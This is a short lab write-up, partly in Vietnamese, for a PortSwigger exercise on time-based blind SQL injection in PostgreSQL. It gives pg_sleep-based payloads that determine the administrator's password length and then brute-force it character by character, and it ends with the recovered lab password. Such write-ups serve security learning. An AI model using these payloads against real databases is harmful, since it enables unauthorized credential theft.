# Target Goal: 

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user.

# Recon:

Check version db bằng cách up luôn payload vào và nó là PostgreSQL

![image](https://github.com/vanniichan/Portswigger/assets/112863484/3f5f228c-0be9-4835-92d2-b5b06592bba5)

Bài này sẽ brute-force password thông qua delay time

`' ||(SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- `

![image](https://github.com/vanniichan/Portswigger/assets/112863484/84177838-d74b-4ca3-b689-29c9322735f1)

Result trả về hơi lạ nên sửa lại sleep (-1) 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/50630dd4-29fc-4870-a534-7dc0e5209795)

`Brute-force password `' ||(SELECT CASE WHEN substr(password,1,1) ='a' THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator')-- `

![image](https://github.com/vanniichan/Portswigger/assets/112863484/c640403a-db41-4529-982e-c835e62dfc5a)

`administrator:k5bzdg7vw1l0urjr08n7`

# Flag: 

![image](https://github.com/vanniichan/Portswigger/assets/112863484/4af6439d-99c1-48e7-9367-112c7738ef1e)
